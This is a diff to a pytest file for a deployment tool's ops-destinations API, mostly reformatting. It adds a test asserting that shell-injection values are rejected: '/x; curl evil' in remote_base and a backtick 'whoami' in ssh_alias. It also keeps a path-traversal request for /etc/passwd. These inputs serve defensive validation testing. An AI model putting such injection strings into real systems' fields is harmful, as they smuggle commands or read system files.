@@ -9,14 +9,21 @@ from app.main import app
 @pytest.mark.asyncio
 async def test_ops_destination_model_roundtrip(db_session):
     dest = OpsDestination(
-        id="teste", label="Teste", ssh_alias="flt", remote_base="/root/project",
+        id="teste",
+        label="Teste",
+        ssh_alias="flt",
+        remote_base="/root/project",
         compose_file="docker-compose.alocalizai.yml",
         front_api_url="https://core.alocalizai.com.br/v1/",
-        registry="ghcr.io/isakielsouza", image_tag="alocalizai", enabled=True,
+        image_registry="ghcr.io/isakielsouza",
+        image_tag="alocalizai",
+        enabled=True,
     )
     db_session.add(dest)
     await db_session.commit()
-    row = (await db_session.execute(select(OpsDestination).where(OpsDestination.id == "teste"))).scalar_one()
+    row = (
+        await db_session.execute(select(OpsDestination).where(OpsDestination.id == "teste"))
+    ).scalar_one()
     assert row.ssh_alias == "flt"
     assert row.enabled is True
 
@@ -28,26 +35,70 @@ def test_destinations_crud():
     # em vez de assumir que o seed o inseriu.
     client = TestClient(app)
 
-    seed = {"id": "alocalizai", "label": "Alocalizai", "ssh_alias": "flt",
-            "remote_base": "/root/project", "compose_file": "docker-compose.alocalizai.yml",
-            "front_api_url": "https://core.alocalizai.com.br/v1/",
-            "registry": "ghcr.io/isakielsouza", "image_tag": "alocalizai", "enabled": True}
+    seed = {
+        "id": "alocalizai",
+        "label": "Alocalizai",
+        "ssh_alias": "flt",
+        "remote_base": "/root/project",
+        "compose_file": "docker-compose.alocalizai.yml",
+        "front_api_url": "https://core.alocalizai.com.br/v1/",
+        "registry": "ghcr.io/isakielsouza",
+        "image_tag": "alocalizai",
+        "enabled": True,
+    }
     assert client.post("/api/v1/ops/destinations", json=seed).status_code == 200
 
     r = client.get("/api/v1/ops/destinations")
     assert r.status_code == 200
     assert any(d["id"] == "alocalizai" for d in r.json())
 
-    body = {"id": "cliente2", "label": "Cliente 2", "ssh_alias": "cli2",
-            "remote_base": "/root/project", "compose_file": "docker-compose.alocalizai.yml",
-            "front_api_url": "https://core.cli2.com.br/v1/",
-            "registry": "ghcr.io/isakielsouza", "image_tag": "cliente2", "enabled": True}
+    body = {
+        "id": "cliente2",
+        "label": "Cliente 2",
+        "ssh_alias": "cli2",
+        "remote_base": "/root/project",
+        "compose_file": "docker-compose.alocalizai.yml",
+        "front_api_url": "https://core.cli2.com.br/v1/",
+        "registry": "ghcr.io/isakielsouza",
+        "image_tag": "cliente2",
+        "enabled": True,
+    }
     assert client.post("/api/v1/ops/destinations", json=body).status_code == 200
-    assert client.put("/api/v1/ops/destinations/cliente2",
-                      json={**body, "ssh_alias": "cli2-novo"}).status_code == 200
+    assert (
+        client.put(
+            "/api/v1/ops/destinations/cliente2", json={**body, "ssh_alias": "cli2-novo"}
+        ).status_code
+        == 200
+    )
     assert client.delete("/api/v1/ops/destinations/cliente2").status_code == 200
     r = client.get("/api/v1/ops/destinations")
     assert not any(d["id"] == "cliente2" for d in r.json())
+
+
+def test_destination_rejects_injection():
+    client = TestClient(app)
+    base = {
+        "id": "evil",
+        "label": "Evil",
+        "ssh_alias": "flt",
+        "remote_base": "/root/project",
+        "compose_file": "docker-compose.alocalizai.yml",
+        "front_api_url": "https://core.x/v1/",
+        "registry": "ghcr.io/isakielsouza",
+        "image_tag": "t",
+        "enabled": True,
+    }
+
+    # remote_base com injeção de shell → 422
+    bad_base = {**base, "remote_base": "/x; curl evil"}
+    assert client.post("/api/v1/ops/destinations", json=bad_base).status_code == 422
+
+    # backtick em ssh_alias → 422
+    bad_ssh = {**base, "ssh_alias": "flt`whoami`"}
+    assert client.post("/api/v1/ops/destinations", json=bad_ssh).status_code == 422
+
+    # válido → 200
+    assert client.post("/api/v1/ops/destinations", json=base).status_code == 200
 
 
 def test_run_unknown_destination_404():
@@ -66,7 +117,7 @@ def test_status_idle():
 def test_logs_rejects_path_traversal():
     client = TestClient(app)
     r = client.get("/api/v1/ops/logs/..%2F..%2F..%2Fetc%2Fpasswd")
-    assert r.status_code in (400, 404)   # must NOT 200 with file contents
+    assert r.status_code in (400, 404)  # must NOT 200 with file contents
 
 
 def test_logs_rejects_bad_format():
